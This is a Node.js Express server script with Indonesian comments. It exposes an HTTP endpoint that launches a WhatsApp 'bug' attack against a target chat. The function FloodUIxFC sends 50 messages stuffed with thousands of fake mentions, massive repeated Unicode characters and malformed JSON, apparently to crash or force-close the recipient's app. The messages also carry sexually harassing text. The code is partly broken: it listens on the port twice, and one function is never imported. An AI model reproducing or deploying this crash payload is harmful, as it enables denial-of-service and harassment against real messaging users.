const express = require('express');
const app = express();

// Ambil port dari environment (Pterodactyl biasanya inject, contoh: SERVER_PORT atau PORT)
const port = process.env.PORT || process.env.SERVER_PORT || 2844;
const host = '0.0.0.0';

console.log('Using host:', host);
console.log('Using port:', port);

const server = app.listen(port, host, () => {
  console.log(`Server running on ${host}:${port}`);
});

server.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`Port ${port} sudah dipakai. Hentikan proses lain atau ganti port.`); 
  } else {
    console.error('Server error:', err);
  }
  process.exit(1);
});

// Simple API key (optional) — set di panel environment variable: API_KEY=rahasia123
const requiredKey = process.env.API_KEY || null;

//FUNC BUG
async function FloodUIxFC(sock, target) {
  const floodXMention = [
    "0@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 5000 }, () =>
      "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
    ),
  ];

  for (let i = 0; i < 50; i++) {
    const mediaFlood = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "mau di entot zephyrine ga?😖",
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: floodXMention,
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING",
              },
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
              ],
              messageParamsJson: "{{".repeat(10000),
            },
          },
          extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "mau di entot zephyrine ga?😖" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
      },
    };

    try {
      const msg = generateWAMessageFromContent(target, mediaFlood, {});
      await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
      });
    } catch (err) {
      console.error("Flood UI Force Close Error:", err);
    }
  }
}

// Definisikan function-function yang bisa dipanggil
const functions = {
  flood: async ({ chatId, sock }) => {
    if (!/^\d+@s\.whatsapp\.net$/.test(chatId)) {
      return `invalid chatId format: ${chatId}`;
    }
    const usedSock = sock || { id: 'dummy' }; // kalau kamu belum punya instance nyata
    return await FloodUIxFC(usedSock, chatId);
  },
  echo: async ({ chatId }) => `echo to ${chatId}`,
};

app.get('/rexxin', async (req, res) => {
  const { type, chatId, key } = req.query;

  if (requiredKey && key !== requiredKey) {
    return res.status(401).send('unauthorized');
  }

  if (!type || !chatId) {
    return res.status(400).send('missing type or chatId');
  }

  const fn = functions[type];
  if (!fn) {
    return res.status(404).send(`function ${type} not found`);
  }

  try {
    const output = await fn({ chatId });
    res.setHeader('Content-Type', 'text/plain');
    res.send(output);
  } catch (err) {
    console.error('function error', err);
    res.status(500).send('internal error');
  }
});

app.get('/', (req, res) => {
  res.send('rexxin API alive');
});

app.listen(port, host, () => {
  console.log(`rexxin API running on ${host}:${port}`);
});
